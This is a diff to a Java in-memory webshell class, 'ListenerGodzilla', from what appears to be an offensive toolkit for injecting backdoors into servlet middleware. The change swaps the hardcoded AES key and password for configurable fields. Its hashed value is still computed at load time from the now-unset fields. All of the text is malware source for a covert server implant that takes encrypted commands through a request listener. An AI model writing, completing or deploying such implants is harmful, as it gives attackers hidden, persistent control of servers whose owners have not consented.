@@ -1,5 +1,6 @@
 package com.ppp.middleware.memshell;
 
+import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
 
@@ -14,10 +15,11 @@ import java.net.URLClassLoader;
  */
 @MemShell(MemShell.Listener)
 @MemShellFunction(MemShellFunction.Godzilla)
+@JavaClassModifiable({JavaClassModifiable.key, JavaClassModifiable.pass})
 public class ListenerGodzilla implements InvocationHandler {
-    public static String xc = "3c6e0b8a9c15224a"; // key
-    public static String pass = "pass";
-    public static String md5 = md5(pass + xc);
+    public static String key; // key
+    public static String pass;
+    public static String md5 = md5(pass + key);
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("requestInitialized")) {
@@ -80,7 +82,7 @@ public class ListenerGodzilla implements InvocationHandler {
     public byte[] x(byte[] s, boolean m) {
         try {
             javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
-            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
+            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
             return c.doFinal(s);
         } catch (Exception e) {
             return null;
